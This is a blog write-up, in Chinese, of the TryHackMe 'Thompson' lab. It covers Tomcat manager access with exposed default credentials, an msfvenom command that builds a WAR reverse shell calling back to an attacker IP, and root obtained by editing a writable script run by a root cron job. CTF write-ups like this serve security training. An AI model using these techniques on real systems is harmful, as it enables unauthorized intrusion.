---
title: '[thm] Thompson'
date: 2024-12-26 14:15 +0800
categories: [hack,TryHackMe]
tags: []
---



## information

![image-20241226141638959](../assets/img/2024-12-26-%5Bthm%5D%20Thompson.assets/image-20241226141638959.png)

> nmap扫描

![image-20241226142025415](../assets/img/2024-12-26-%5Bthm%5D%20Thompson.assets/image-20241226142025415.png)

> 8080端口截图

看到开放了三个端口。其中`8009`这个端口和对应的`ajp13`服务引起了我的兴趣，查询可知，这个服务存在一个任意文件读取的漏洞，并且事实上这个漏洞确实存在。

8080端口是一个`tomcat`，理所当然的查看`manager`路径，登录页面需要账号密码。

![image-20241226142311254](../assets/img/2024-12-26-%5Bthm%5D%20Thompson.assets/image-20241226142311254.png)

到此为止，我一开始觉得思路就很清晰了，我只需要通过任意文件读取的漏洞查看到`conf/tomcat-user.xml`中的账号密码就可以了。事实并非如此，任意文件读取就是一个兔子洞，我在这里浪费了太多的时间，其实只需要按下`Cancel`按钮，就可以直接看到密码......

![image-20241226142458987](../assets/img/2024-12-26-%5Bthm%5D%20Thompson.assets/image-20241226142458987.png)

> zhei您受得了吗。

**tomcat/s3cret**

## user1

有了tomcat的后台页面，顺理成章我们上传一个war木马，就可以拿到shell

```shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.14.95.76 LPORT=1234 -f war -o shell.war
```

偷个懒，就不复现一遍了。

![image-20241226142721955](../assets/img/2024-12-26-%5Bthm%5D%20Thompson.assets/image-20241226142721955.png)

## root

![image-20241226142849270](../assets/img/2024-12-26-%5Bthm%5D%20Thompson.assets/image-20241226142849270.png)

到`jack`哥哥的家目录下。可以发现一个`id.sh`。里面内容大致如下（这里的已经被我修改了）。

```sh
#/bin/bash

id > test.txt
```

同时查看定时任务发现，这是`root`的定时任务，每分钟执行。我看到命令行内容第一反应是劫持环境变量提权，但是这里注意权限，我们对`id.s`h是可读可写可执行。所以我们只要修改sh脚本的内容，就可以得到我们想要的`root.txt`

![image-20241226143347446](../assets/img/2024-12-26-%5Bthm%5D%20Thompson.assets/image-20241226143347446.png)

> own~

## conclusion

- 注重思路的同时要注意细节。这个靶机两个点都与细节有关，`cancel`一个，`sh`脚本权限一个。
